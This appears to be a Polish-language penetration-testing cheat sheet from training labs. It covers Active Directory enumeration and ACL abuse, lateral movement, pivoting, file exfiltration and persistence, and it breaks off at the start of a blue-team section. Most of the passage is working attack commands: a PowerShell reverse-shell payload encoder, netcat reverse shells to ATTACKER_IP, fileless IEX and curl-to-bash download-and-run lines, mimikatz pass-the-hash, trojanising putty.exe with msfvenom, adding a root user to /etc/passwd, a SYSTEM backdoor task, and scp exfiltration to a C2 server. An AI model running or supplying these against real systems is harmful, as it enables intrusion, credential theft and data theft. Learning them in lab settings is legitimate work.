### D. Moduł ActiveDirectory (natywny, „czysty”)
```powershell
Get-Module -ListAvailable ActiveDirectory ; Import-Module ActiveDirectory
Get-ADUser -Filter *                              # wszyscy użytkownicy
Get-ADUser -Identity <user> -Properties *         # szczegóły (w tym description!)
Get-ADUser -Filter "Name -like '*admin*'"          # konta 'admin'
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # konta z SPN
Get-ADGroup -Filter * | select name                # grupy
Get-ADGroupMember -Identity "Domain Admins"        # członkowie grupy
Get-ADComputer -Filter * -Properties OperatingSystem | select name,OperatingSystem
Get-ADDefaultDomainPasswordPolicy                  # polityka haseł (SPRAWDŹ przed sprayingiem!)
```

### Grupy warte uwagi
> Domain Admins / Administrators = klucze do całego AD. Enterprise Admins = multi-domain forest.
> Server Operators, Backup Operators = uprzywilejowane wbudowane. Cokolwiek z "Admin" w nazwie (np. "SQL Admins").

## 6.3 net / wmic (cmd)

```cmd
net user /domain                 :: userzy domeny (bez /domain = lokalni)
net user <username> /domain      :: info o userze domeny
net group /domain                :: grupy domeny
net group "Group Name" /domain   :: członkowie grupy
net localgroup                   :: grupy lokalne
net localgroup Administrators    :: lokalni admini
query user                       :: zalogowane sesje (alias quser)
tasklist /V                      :: procesy + konta
net session                      :: sesje SMB
net view \\dc01 /all             :: share'y na hoscie
```
WMIC — usługi i konta serwisowe (szukaj DomainName\username → reużycie creds):
```cmd
wmic service get Name,StartName
:: PS: Get-WmiObject Win32_Service | select Name, StartName
```

## 6.4 MSSQL w AD (patrz też §2.1)
```bash
impacket-mssqlclient Administrator:Lab123@$IP -windows-auth
```

## 6.5 ACL abuse — przejęcie konta przez uprawnienia obiektu

> Jedna z najczęstszych ścieżek w AD: Twoje konto (albo grupa, w której jesteś) ma **potężne prawo nad innym obiektem**. To pętla: *enumeruj prawa → nadużyj → zaloguj się jako ofiara → enumeruj ponownie z jej kontekstu → …* aż dojdziesz do celu/flagi.

### Prawa, które dają przejęcie
| Prawo (ActiveDirectoryRights / ACE) | Co pozwala | Nadużycie |
|---|---|---|
| **GenericAll** | pełna kontrola | reset hasła / dodanie SPN / wszystko |
| **User-Force-Change-Password** | wymuś zmianę hasła | `Set-DomainUserPassword` |
| **GenericWrite / WriteProperty** | zapis atrybutów | targeted Kerberoast (ustaw SPN) lub logon script |
| **WriteDacl** | zapis ACL | dopisz sobie GenericAll → reset |
| **WriteOwner** | zmiana właściciela | zostań ownerem → WriteDacl → GenericAll |
| **AddMember (nad grupą)** | zapis `member` | dodaj się do uprzywilejowanej grupy |

### Krok 1 — enumeracja ACL (poprawnie: OBA wymiary)
> ⚠️ Najczęstszy błąd: filtrowanie tylko po SID usera i tylko po obiektach-userach → fałszywe „nic tu nie ma". Prawa wisi na **grupach** i nad **grupami/komputerami**.
```powershell
# principal = mój SID + SID-y WSZYSTKICH moich grup (też zagnieżdżone)
$sids  = @()
$sids += (Get-DomainUser  -Identity <ja>).objectsid
$sids += (Get-DomainGroup -MemberIdentity <ja>).objectsid

# cel = WSZYSTKIE obiekty (users, groups, computers), nie tylko userzy
Get-DomainObjectAcl -Identity * -ResolveGUIDs |
  ? { $sids -contains $_.SecurityIdentifier } |
  select ObjectDN, ActiveDirectoryRights, ObjectAceType, SecurityIdentifier
```
Alternatywa szybka: `Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -eq '<ja>' }`

**Jak czytać wynik:** `SecurityIdentifier`/`IdentityReferenceName` = kto ma prawo (Twój SID/grupa) · `ObjectDN` = nad kim · `ActiveDirectoryRights` = jakie prawo · `ObjectAceType` (dzięki `-ResolveGUIDs`) = np. `User-Force-Change-Password`. `AccessMask 983551` = pełny GenericAll.

### Krok 2 — nadużycie (dobierz do prawa)
```powershell
# GenericAll / ForceChangePassword → reset hasła ofiary (nie musisz znać starego):
$np = ConvertTo-SecureString 'Passw0rd!2024' -AsPlainText -Force
Set-DomainUserPassword -Identity <ofiara> -AccountPassword $np -Verbose

# GenericWrite → targeted Kerberoast (nie psujesz konta — czystsze niż reset):
Set-DomainObject -Identity <ofiara> -Set @{serviceprincipalname='fake/svc'} -Verbose
Get-DomainSPNTicket -Identity <ofiara>          # hash TGS-REP → hashcat -m 13100 (offline)
Set-DomainObject -Identity <ofiara> -Clear serviceprincipalname   # POSPRZĄTAJ

# WriteDacl → dopisz sobie GenericAll, potem reset jak wyżej:
Add-DomainObjectAcl -TargetIdentity <ofiara> -PrincipalIdentity <ja> -Rights All -Verbose

# AddMember nad grupą → dodaj się do niej (aktywuje prawa grupy):
Add-DomainGroupMember -Identity '<Grupa>' -Members <ja> -Verbose
```

### Krok 3 — zaloguj się jako ofiara
```cmd
runas /user:<DOMENA>\<ofiara> powershell        :: na hoście, w kontekście ofiary
```
Z Kali: `xfreerdp /u:<ofiara> /p:'Passw0rd!2024' /v:<host>`  albo  `evil-winrm -i <IP> -u <ofiara> -p 'Passw0rd!2024'`. Weryfikacja: `whoami ; whoami /groups`.

### Krok 4 — enumeruj ponownie z kontekstu ofiary → flaga / kolejny skok
```powershell
$sid2 = (Get-DomainUser -Identity <ofiara>).objectsid
Get-DomainObjectAcl -Identity * -ResolveGUIDs | ? { $_.SecurityIdentifier -eq $sid2 } |
  select ObjectDN, ActiveDirectoryRights, ObjectAceType
Find-LocalAdminAccess ; Find-DomainShare -CheckShareAccess    # nowy dostęp dopiero jako ofiara
Get-DomainUser -Identity <ofiara> -Properties description,info,memberof   # flaga bywa w description
```
Jeśli ofiara ma prawo nad kolejnym obiektem → powtórz Krok 1–4. Jeśli to koniec łańcucha → flaga zwykle w `description`/`info`, na pulpicie ofiary, albo na share dostępnym z jej konta.

> ⚠️ **Tradecraft:** reset hasła jest destrukcyjny (blokuje prawdziwego usera) — w labie OK, w realnym teście wybieraj Kerberoast/SPN gdy masz GenericWrite i ZAWSZE sprzątaj dopisane SPN-y/ACL-e/członkostwa. Odnotuj każdą zmianę do raportu.

### Czytanie ACL — SID → nazwa
> Output ACL ma `SecurityIdentifier` jako surowy SID. Zawsze go rozwiń, żeby wiedzieć KTO to:
```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
# wiele naraz (np. wszystkie SID-y z GenericAll nad grupą):
"S-1-5-...-512","S-1-5-...-1104","S-1-5-32-548" | Convert-SidToName
# widok ACL grupy filtrowany po prawie:
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

### Nadużycie AddMember natywnie (net) + sprzątanie
```cmd
net group "Management Department" stephanie /add /domain    :: dodaj się do grupy
net group "Management Department" stephanie /del /domain     :: POSPRZĄTAJ po sobie
```
```powershell
Get-NetGroup "Management Department" | select member         # weryfikacja (przed i po)
```

## 6.6 Domain shares & SYSVOL (GPP cpassword)

> Share'y to skarbnica: skrypty z hasłami, backupy, klucze — a **SYSVOL** (czytelny dla każdego usera domeny) często zawiera stare GPP z zaszyfrowanym hasłem (`cpassword`), które odszyfrujesz publicznym kluczem.

```powershell
Find-DomainShare -CheckShareAccess                 # share'y, do których MAM dostęp
# przejrzyj SYSVOL (replikowany na wszystkie DC, czytelny dla domeny):
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\
# GPP z hasłem — Groups.xml / *-policy-backup.xml zawierają pole cpassword:
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
# poluj rekurencyjnie po całym SYSVOL:
Get-ChildItem \\dc1.corp.com\sysvol\ -Recurse -Include *.xml,*.ps1,*.bat,*.vbs -ErrorAction SilentlyContinue | Select-String -Pattern "cpassword|password|net use"
```
Odszyfrowanie `cpassword` na Kali (klucz AES jest publiczny — MS go opublikował):
```bash
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
# alternatywnie: impacket-Get-GPPPassword / crackmapexec smb $IP -u u -p p -M gpp_password
```
> 💎 **Czego szukać na share'ach:** `cpassword` w Groups.xml/Services/ScheduledTasks/DataSources · pliki `unattend.xml`/`sysprep.xml` · skrypty logowania z `net use ... /user:` · `.kdbx`/`.ppk`/`id_rsa` · configi z connection stringami · backupy (`*.bak`, `*.vhd`, NTDS). Zapis do share z logon-scriptem = możliwość podłożenia payloadu.

---

# 7. Lateral Movement (Ruch boczny)

> Cel fazy: z jednego hosta na kolejny, zwykle z pozyskanymi poświadczeniami/hashem.
> **Najpierw** przygotuj payload (§2.4), potem użyj metody uruchomienia zdalnego poniżej.

## 7.1 Zdalne wykonanie z poświadczeniami

> 🎯 **Który mechanizm?** Masz *hasło* local-admina → PsExec / WMI / WinRS. Masz tylko *hash* → PtH (impacket-wmiexec) lub Overpass-the-Hash (§7.2). Cel wymusza *Kerberos* (po nazwie hosta) → Overpass/PtT. WinRM/SMB zablokowane → DCOM (135). **Warunek dla większości: user w grupie Administrators celu** (WinRS wystarczy też *Remote Management Users*).

### Payload: zakoduj reverse shell do base64 (pod WMI/WinRS/DCOM)
> Argumenty z cudzysłowami psują się przy zdalnym wywołaniu — podawaj payload jako `powershell -nop -w hidden -e <base64>`. Listener `nc -lnvp 443` odpal PRZED.
```python
# encode.py — utf16+base64 (strip BOM [2:]); podmień IP/port na swój listener
import base64
p='$c=New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'
print("powershell -nop -w hidden -e "+base64.b64encode(p.encode('utf16')[2:]).decode())
```

### PsExec (445/TCP SMB, grupa Administrators)
```cmd
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```
> Wymaga: user w lokalnych Administrators celu + share **ADMIN$** + File&Printer Sharing. Zostawia `psexesvc.exe` w `C:\Windows` + tworzy usługę (ślad forensyczny).
### WinRM (5985/5986, grupa Remote Management Users)
```cmd
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```
Z Linuxa (evil-winrm — mój ulubiony do foothold na AD):
```bash
evil-winrm -i $IP -u Administrator -p 'Mypass123'
evil-winrm -i $IP -u Administrator -H <NTLM_HASH>        # pass-the-hash
```
### sc.exe — usługi zdalne (135/445/139, Administrators)
```cmd
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```
> ⚠️ Spacja po `binPath=` i `start=` jest wymagana (składnia sc).

**Pełny łańcuch sc z payloadem (przykład z modułu):**
```bash
# 1. Payload service EXE
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=$LHOST LPORT=4444 -o myservice.exe
# 2. Upload na admin$
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
# 3. Listener (msfconsole: use exploit/multi/handler; set LHOST; exploit)  +  nc -lvnp 4443
# 4. runas z creds na pierwszej maszynie:
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
# 5. Odpal usługę na nowym hoscie:
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```

### WMI — najprostsza forma (process call create)
```cmd
:: jednolinijkowiec (wmic, przestarzały ale wszędzie działa); ReturnValue=0 = sukces, zwraca PID
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```
> RPC na 135, dane sesji na 49152-65535. Proces startuje w Session 0. `wmic` przestarzały → preferuj metodę PowerShell CIM/DCOM poniżej. UAC-remote NIE dotyczy userów domenowych → masz pełne prawa do lateral.

### WMI + MSI (135/5985, Administrators)
```bash
# 1. Payload MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi > myinstaller.msi
# 2. Upload
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```
Na hoscie (PowerShell) — sesja WMI i instalacja:
```powershell
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

### impacket (Linux → Windows, jeden z najczęstszych)
```bash
impacket-psexec $DOMAIN/user:password@$IP           # SYSTEM shell
impacket-wmiexec $DOMAIN/user:password@$IP          # cichszy (bez usługi)
impacket-smbexec $DOMAIN/user:password@$IP
impacket-atexec $DOMAIN/user:password@$IP whoami    # przez scheduled task
```

### PowerShell Remoting (5985/5986, WinRM z poświadczeniami)
```powershell
$cred = New-Object System.Management.Automation.PSCredential('corp\jen',(ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force))
Enter-PSSession -ComputerName 192.168.50.73 -Credential $cred          # sesja interaktywna
$sess = New-PSSession -ComputerName 192.168.50.73 -Credential $cred
Invoke-Command -Session $sess -ScriptBlock { hostname; whoami }        # zdalne polecenie
Invoke-Command -ComputerName files04 -Credential $cred -ScriptBlock { whoami }
```
### winrs (natywny klient WinRM, cmd)
```cmd
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```
### DCOM (lateral przez 135, gdy WinRM/SMB odpadają)
```powershell
# a) MMC20.Application — wykonaj polecenie zdalnie (bez podawania creds, użyje Twojego tokenu):
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
# b) CIM/DCOM Win32_Process Create (z creds — patrz $cred wyżej):
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName 192.168.50.73 -Credential $cred -SessionOption $Opt
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell -enc <b64>"}
```

## 7.2 Pass-the-Hash / Ticket / Key

### Pass-the-Hash (NTLM)
```
mimikatz
token::revert
sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.13 4444"
```
Z Linuxa (format `-hashes LM:NT` — LM wypełnij 32 zerami gdy masz tylko NT):
```bash
xfreerdp /v:$IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
impacket-wmiexec -hashes :NTLM_HASH Administrator@$IP    # ciszej niż psexec (bez usługi/pliku, shell jako user)
impacket-psexec  -hashes :NTLM_HASH DOMAIN/MyUser@$IP    # głośny: usługa + exe na ADMIN$, ale shell SYSTEM
evil-winrm -i $IP -u MyUser -H NTLM_HASH
smbclient \\\\$IP\\secrets -U Administrator --pw-nt-hash <NThash>   # samo CZYTANIE share'a NT hashem
```
> ⚠️ **Dlaczego PtH nie działa (90% przypadków):** **UAC remote restrictions** (default od Visty) blokują zwykłych local-adminów zdalnie — niezawodnie do code-exec działa tylko **wbudowany Administrator (RID 500)**. Konta domenowe działają zawsze (`CORP/Administrator@IP`). Ten sam local-admin password bywa **współdzielony** między hostami → hash z jednego otwiera resztę.

### Overpass-the-Hash (hash NTLM → bilet Kerberos)
> Gdy cel wymusza **Kerberos** (PsExec/usługa po nazwie hosta, nie po IP), a masz tylko hash NTLM. Zamień hash na TGT i uwierzytelniaj się Kerberosem. Wymaga admina lokalnie (odczyt LSASS).
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords          :: wyciągnij hash NTLM ofiary
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
```cmd
:: w NOWYM powershellu (kontekst ofiary):
klist                                   :: na start 0 biletów
net use \\files04                       :: dowolna akcja domenowa WYMUSZA utworzenie TGT+TGS
klist                                   :: teraz widać TGT (krbtgt/CORP.COM) + CIFS TGS
.\PsExec.exe \\files04 cmd              :: PsExec po NAZWIE hosta → Kerberos (po IP wymusiłoby NTLM = fail)
```
> ⚠️ `whoami` w nowym oknie pokaże Twojego pierwotnego usera (token się nie zmienia) — to normalne, liczą się wstrzyknięte bilety. PsExec **nie** przyjmuje hasha → dlatego najpierw robisz bilet.

### Pass-the-Ticket (kradzież cudzego biletu z pamięci)
> Ukradnij TGS/TGT innego zalogowanego usera i wstrzyknij, by wejść tam, gdzie on ma dostęp (np. restricted share). Jeśli bilety należą do Ciebie — admin niepotrzebny.
```
mimikatz
privilege::debug
sekurlsa::tickets /export                :: zrzuca wszystkie bilety do plików .kirbi w bieżącym katalogu
```
```cmd
dir *.kirbi                              :: wybierz bilet w formacie <user>@cifs-<host>.kirbi
```
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
```powershell
klist                                    # potwierdź wstrzyknięty bilet (np. dave cifs/web04)
ls \\web04\backup                        # sprawdź dostęp PRZED i PO (dowód działania)
```
> TGS działa tylko dla jednej usługi/hosta; TGT (~10h) pozwala poprosić o dowolny TGS.

### Pass-the-Key (z ekeys)
```
mimikatz
privilege::debug
sekurlsa::ekeys
```
```
:: RC4
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
:: AES128
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"..."
:: AES256
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"..."
```

## 7.3 RDP hijacking (SYSTEM, Server 2016 i starsze)
> Sesja RDP zamknięta bez wylogowania zostaje otwarta — z SYSTEM przejmiesz ją bez hasła.
```cmd
PsExec64.exe -s cmd.exe                 :: uzyskaj SYSTEM
query user                              :: znajdź sesje (stan Disc = porzucona)
tscon 3 /dest:rdp-tcp#6                 :: przejmij sesję ID 3 na swoją SESSIONNAME
```

---

# 8. Pivoting & Port Forwarding

> Scenariusz w przykładach: `1.1.1.1` = atakujący (SSH server), `2.2.2.2` = PC-1 (pivot, SSH client), `3.3.3.3` = cel wewnętrzny.

> 🎯 **Drogowskaz — co po kolei:** 1) na pivocie `ip addr`+`ip route` → druga karta/podsieć, której Kali nie widzi. 2) loot configów po creds (DB/app). 3) dobierz metodę wg firewalla: **inbound otwarty** → socat / SSH `-L`/`-D` (bind na pivocie); **inbound blokowany, outbound OK** → SSH `-R`/remote-dynamic / Plink (bind na Kali); **Windows** → ssh.exe / Plink / netsh portproxy. 4) postaw tunel → **ZWERYFIKUJ** listener (`ss -ntplu`). 5) skieruj narzędzia na lokalny koniec (`proxychains` dla SOCKS; edytuj `/etc/proxychains4.conf`). 6) enumeruj (`proxychains nmap -sT -Pn -n`), złap kolejny hop, powtórz. 7) **CLEANUP:** ubij tunele, usuń binarki, na Windzie skasuj OBA — portproxy I regułę firewalla.
> 💎 **Co wartościowe:** druga/trzecia karta i CIDR · creds z configów (reuse) · share'y widoczne tylko z wewnątrz · czy pivot ma `socat`/`ssh` (`which`, `where`) · Win-binarki w Kali `/usr/share/windows-resources/binaries/` (nc.exe, plink.exe).

## 8.1 SSH tunneling

Przygotowanie usera do tunelu (na maszynie atakującej):
```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
### Remote Port Forwarding (`-R`) — wystaw port celu na SWOJEJ maszynie
> Na PC-1 (ma dostęp do portu 3389 celu), pchamy go do nas:
```bash
# na PC-1:
ssh tunneluser@ATTACKER_IP -R 3389:SERVER_IP:3389 -N
# u nas:
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```
### Local Port Forwarding (`-L`) — wciągnij port z naszej maszyny na PC-1
```bash
# na PC-1: udostępnij nasz port 80 lokalnie na PC-1
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
# firewall na PC-1 (jeśli trzeba, wymaga admina):
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```
### Dynamic Port Forwarding + SOCKS — skanuj całą podsieć przez pivot
```bash
# REVERSE dynamic (-R 9050) — SOCKS na Kali; gdy inbound do pivota blokowany:
ssh tunneluser@1.1.1.1 -R 9050 -N
# LOCAL dynamic (-D) — SOCKS NA pivocie; gdy MASZ konto SSH na pivocie i inbound otwarty:
ssh -N -D 0.0.0.0:9999 db_admin@10.4.50.215
# /etc/proxychains4.conf → socks5 <IP> <port> (obniż tcp_read/connect_time_out); potem:
proxychains smbclient -L //172.16.50.217/ -U hr_admin
sudo proxychains nmap -vvv -sT -Pn -n --top-ports=20 172.16.50.217   # przez SOCKS TYLKO -sT -Pn
```
> `proxychains` działa tylko na **dynamicznie** linkowanych binarkach (nie statyczne). SYN/raw nie przechodzi przez SOCKS → `-sT -Pn`.

### sshuttle — transparentny pseudo-VPN (bez proxychains)
```bash
sshuttle -r db_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24   # potem NORMALNE narzędzia, bez -p/proxychains
```
> Wymaga root na Kali + Python3 na pivocie. Routuje TYLKO podane CIDR. Komunikaty „Failed to flush caches" są nie-fatalne.

### Windows pivot — Plink / netsh portproxy / bundled ssh.exe
```cmd
:: Plink remote-forward (gdy brak OpenSSH; nc.exe/plink.exe w /usr/share/windows-resources/binaries/):
cmd.exe /c echo y | plink.exe -ssh -l kali -pw <PASS> -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP
:: netsh portproxy — natywne, zero uploadu (WYMAGA admina; usuń OBA wpisy w cleanup!):
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<PIVOT_WAN> connectport=22 connectaddress=10.4.50.215
netsh advfirewall firewall add rule name="pf2222" protocol=TCP dir=in localport=2222 action=allow
:: nowoczesny Windows MA klienta OpenSSH (od 1803) → remote-dynamic jak w Linuksie:
where ssh & ssh -N -R 9998 kali@KALI_IP
```
> Sam `portproxy` = port „filtered" → MUSISZ dodać regułę `advfirewall allow`. Weryfikacja: `netstat -anp TCP | find "2222"` + `netsh interface portproxy show all`. Cleanup: `netsh ... delete rule` **oraz** `portproxy del` (przeżywają reboot). Confluence loot → hashcat `-m 12001` (`{PKCS5S2}`).

## 8.2 socat (gdy nie ma SSH)
```bash
# Na PC-1: otwórz 3389 i przekieruj na cel
socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
# Na PC-1: wystaw nasz port 80 dla celu
socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
# firewall (Windows pivot):
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```
> socat nie łączy się bezpośrednio do atakującego jak SSH — otwiera port na pivocie, do którego się dopinasz.

## 8.3 chisel (nowoczesny, gdy socat/SSH odpadają — świetny na Windę)
```bash
# U atakującego (server + reverse):
./chisel server -p 8000 --reverse
# Na pivocie (client) — SOCKS proxy przez tunel:
./chisel client ATTACKER_IP:8000 R:socks
# Potem proxychains jak wyżej (domyślnie socks5 127.0.0.1 1080).
# Pojedynczy port zamiast SOCKS:
./chisel client ATTACKER_IP:8000 R:3389:3.3.3.3:3389
```
> Alternatywa premium: **ligolo-ng** (tworzy interfejs tun, nie potrzebujesz proxychains).

## 8.4 Tunneling przez DPI (gdy filtrują ruch)

> Gdy firewall/DPI przepuszcza tylko HTTP(S) albo DNS — opakuj tunel w dozwolony protokół. Wolniejsze, ale przechodzi.

### chisel przez HTTP (SOCKS w WebSocket)
```bash
# Staging (cel ściąga binarz po HTTP): sudo cp $(which chisel) /var/www/html/ ; sudo systemctl start apache2
# tail -f /var/log/apache2/access.log   ← 'GET /chisel 200' potwierdza pobranie (blind RCE nie ma stdout)
chisel server --port 8080 --reverse                       # Kali (server, reverse)
# Na celu (przez RCE/webshell):
wget ATTACKER_IP/chisel -O /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client ATTACKER_IP:8080 R:socks > /dev/null 2>&1 &
ss -ntplu                                                 # weryfikacja: 127.0.0.1:1080 owner chisel = SOCKS wstał
proxychains nmap -sT 172.16.5.0/24
```
> ⚠️ **GLIBC:** chisel z repo Kali (Go 1.20) pada `GLIBC_2.32 not found` na starym Ubuntu → weź oficjalny **v1.8.1** (Go 1.19) z GitHuba (`chisel -h` pokazuje wersję Go); dopasuj arch (amd64/aarch64).
> **Debug blind-RCE** (client pada po cichu): `... R:socks &> /tmp/output; curl --data @/tmp/output http://ATTACKER_IP:8080/` → body zobaczysz w `sudo tcpdump -nvvvXi tun0 tcp port 8080` (żaden web server niepotrzebny).
### DNS tunneling — dnscat2 (gdy wychodzi tylko DNS)
```bash
# Kali = autorytatywny NS dla kontrolowanej domeny (np. feline.corp):
dnscat2-server feline.corp
# Na celu (klient) — bezpośrednio lub przez lokalny resolver:
./dnscat feline.corp
./dnscat --dns server=ATTACKER_IP,port=53 --secret=<SECRET> feline.corp
# W konsoli serwera:  windows → lista sesji ;  window -i 1 → wejdź ;  potem: shell / exec / listen
# TCP port-forward przez tunel DNS (payoff — przepchnij SMB z głębi sieci):
listen 127.0.0.1:4455 172.16.2.11:445           # [lhost:]lport rhost:rport (bind na hoście NS)
smbclient -p 4455 -L //127.0.0.1 -U hr_admin    # narzędzie celuje w lokalny koniec
```
> **Najpierw UDOWODNIJ drogę DNS:** `sudo dnsmasq -C dnsmasq.conf -d` (`auth-zone=feline.corp`) + `sudo tcpdump -i ens192 udp port 53`, na celu `nslookup x.feline.corp` (NXDOMAIN OK — liczy się, że zapytanie dotarło; `resolvectl flush-caches`). Sesja startuje „ENCRYPTED but NOT VALIDATED" → porównaj auth-string na obu końcach albo `--secret=<KEY>`. **Ubij `dnsmasq` przed `dnscat2-server`** (oba chcą UDP/53). Alternatywa: **iodine**.

### SSH przez łańcuch SOCKS
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.4.50.215
```

---

# 9. Exfiltration & File Transfer

> Cel fazy: przerzucanie plików w obie strony (payload na cel, dane/loot do siebie).

## 9.1 Serwery po stronie atakującego
```bash
python3 -m http.server 8000                          # prosty HTTP (pobieranie z celu)
python3 -m http.server 8000 --bind $LHOST
impacket-smbserver share ./ -smb2support             # SMB share (świetne dla Windy)
impacket-smbserver share ./ -smb2support -user u -password p   # z uwierzytelnieniem
nc -lvnp 4444 > loot.zip                             # odbiór pliku przez netcat
```

## 9.2 Pobieranie na cel — Linux
```bash
wget http://$LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://$LHOST:8000/linpeas.sh -o /tmp/linpeas.sh
curl http://$LHOST:8000/shell.sh | bash              # bez zapisu na dysk
```

## 9.3 Pobieranie na cel — Windows
```powershell
# PowerShell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"   # fileless
(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8000/nc.exe','C:\Users\Public\nc.exe')
Invoke-WebRequest http://ATTACKER:8000/nc.exe -OutFile nc.exe
# certutil (LOLBin — działa też jako download)
certutil -urlcache -split -f "http://ATTACKER:8000/payload.exe" C:\Users\Public\payload.exe
# Z SMB share (impacket-smbserver):
copy \\ATTACKER\share\nc.exe C:\Users\Public\nc.exe
```

## 9.4 Bez uploadu — przez tekst (hex/base64)
Gdy masz tylko shell tekstowy — „wypluj" plik i odtwórz u siebie:
```bash
# Na celu:
xxd -p tajny_plik.zip > data.hex
base64 -w0 tajny_plik.zip                             # alternatywa
# U atakującego:
xxd -r -p data.hex > odzyskany_plik.zip
# base64 -d data.b64 > odzyskany_plik.zip
```
Windows base64:
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.kdbx"))   # skopiuj output
# u atakującego: echo '<b64>' | base64 -d > loot.kdbx
certutil -encode plik plik.b64   /   certutil -decode plik.b64 plik   # LOLBin b64
```

## 9.5 Klasyczna eksfiltracja (z modułów)
```bash
tar czf dump.tar.gz /root /etc/                       # archiwizacja
scp dump.tar.gz attacker@c2-server.thm:~              # exfil przez SCP
```

---

# 10. Persistence & Backdooring

### Backdoor w binarce (msfvenom -x — wstrzyknięcie do legalnego .exe)
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp \
  lhost=$LHOST lport=4444 -b "\x00" -f exe -o puttyX.exe
# -x szablon | -k zachowaj oryginalną funkcję | -b znaki zabronione
```
### Linux — dodanie superusera (patrz §4.1 /etc/passwd)
```bash
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
### Windows — scheduled task / usługa jako persistence (patrz §4.2)
```cmd
schtasks /create /tn "Updater" /tr "C:\Users\Public\nc.exe -e cmd.exe ATTACKER 4444" /sc onlogon /ru SYSTEM
```

---

# 11. Blue Team / Forensics

> Sekcja obronna/analityczna — detekcja i triage podejrzanych artefaktów.

## 11.1 Wzorce detekcji (co robi atakujący — do korelacji w logach)
```bash
# Faza 1: Discovery spike
whoami; id; pwd; ls -la; crontab -l                   # rozpoznanie
